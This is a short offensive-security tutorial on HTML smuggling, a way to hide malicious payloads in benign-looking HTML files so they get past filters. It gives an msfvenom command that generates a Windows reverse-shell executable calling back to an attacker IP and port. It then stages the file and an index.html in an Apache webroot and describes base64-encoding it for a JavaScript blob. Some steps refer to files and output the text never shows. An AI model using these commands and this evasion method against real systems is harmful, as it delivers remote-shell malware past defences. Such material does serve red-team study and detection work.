# HTML-Smuggling
HTML Smuggling is an evasive payload delivery method that helps an attacker smuggle payload past content filters and firewalls by hiding malicious payloads inside of seemingly benign HTML files. This is possible by using JavaScript blobs and the HTML5 download attribute used with the anchor tag. This article demonstrates the methodology and two such readily available scripts that perform HTML smuggling.

 - MITRE TACTIC: Defense Evasion (TA0005)
 - MITRE Technique ID: Obfuscated Files or Information (T1027) 
 - MITRE SUB ID: HTML Smuggling (T1027.006)
 
Let’s start with the basics. In HTML5, if we want a user to download a file hosted on our server, we can do that by using the anchor tag.

    <a href=”/payload.exe” download=”payload.exe”>Download Here</a>
For that, let’s first create a payload using msfvenom and copy it in our apache webroot directory.

    msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.0.89 LPORT=1234 -f exe > payload.exe

    cp payload.exe /var/www/html
Then we copy this into the apache webroot and start the apache server

    cp index.html /var/www/html
    
    cd /var/www/html
    
    service apache2 start
But in order to supply this into our blob as a buffer, we need a single string with no enters. This fixing be done manually by copying this output in notepad and removing enters or you could follow our alternate approach by going to ***[base64.guru](https://base64.guru/)*** website.
Here, upload your payload and the converted base64 shall be given in a single line.
